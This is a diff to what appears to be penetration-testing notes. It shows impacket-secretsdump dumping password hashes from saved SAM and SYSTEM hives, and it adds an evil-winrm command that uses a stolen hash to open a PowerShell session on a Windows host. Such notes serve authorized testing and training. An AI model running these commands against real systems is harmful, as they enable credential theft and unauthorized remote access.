@@ -18,3 +18,9 @@ Use impacket to get password hashes:
 impacket-secretsdump -sam sam.save -system system.save LOCAL
 ```
 
+Evilwin-rm to get PowerShell access:
+
+```bash
+evil-winrm -i [IP] -u [username] -H [hash]
+```
+
